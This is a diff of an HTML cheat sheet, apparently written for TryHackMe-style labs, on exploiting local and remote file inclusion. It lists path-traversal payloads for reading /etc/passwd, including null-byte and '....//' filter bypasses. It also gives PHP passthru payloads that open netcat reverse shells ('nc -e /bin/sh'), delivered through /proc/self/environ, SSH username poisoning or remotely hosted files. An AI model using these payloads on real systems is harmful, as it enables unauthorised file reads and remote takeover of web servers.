@@ -174,11 +174,10 @@ nc -e /bin/sh 10.20.14 8080<br>
      <p>if <b>/etc/passwd</b> not work then try, <b>../../../../etc/passwd</b>. If it also didnot work then try, <b>with NULLBYTE(%00, 0x00) at the end of the payload.<br> example: http://webapp.thm/index.php?lang=/etc/passwd%00 or http://webapp.thm/index.php?lang=../../../../etc/passwd%00</b></p>
      <p> If none of them work then try <b>/etc/passwd/.</b> <br> if all of them are failed then oviously try this one - <b>....//....//....//....//....//etc/passwd</b></p>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" style="font-size:1rem;width:500.25px;height:200px">
-     <h4>Tips: some time it only work on url. it also some time word on specified folder. find it and execute payload there.</h4>
     
     <h3>Getting shell from LFI exploit</h3>
     <p><b>Method 1: </b>
-    <ol>Target >> /proc/self/environ<br>
+    <ol>Target >> /proc/self/environ<br><br>
      execute /proc/self/environ . read the file and chose an environ variable. then change it value with payload and forward it through burf suite. 
      <br> PHP payload >> <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre></ol>
     <b>Method 2: </b>
@@ -187,7 +186,9 @@ nc -e /bin/sh 10.20.14 8080<br>
     <p>try to connect with ssh. where payload use on username.<br>
     this time payload would encrypted like <pre> "&lt;?passthru(base64_decode('encrypted code'));?&gt;"</pre>
     </ol>
-    
+    <b>Tips: </b><i>some time it only work on url. it also some time work on specified folder. find it and execute payload there. If get request is broken, then sent payload with post request. always try this.</i>
+
+
     <h2><li>Remote File Inclusion (RFI) exploitation</li></h2>
     <p>Remote file inclusion same as LFI. sent payload url as input. <br>
     make php payload like ( <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre>) or any kind of command and save it as a txt file.<br>
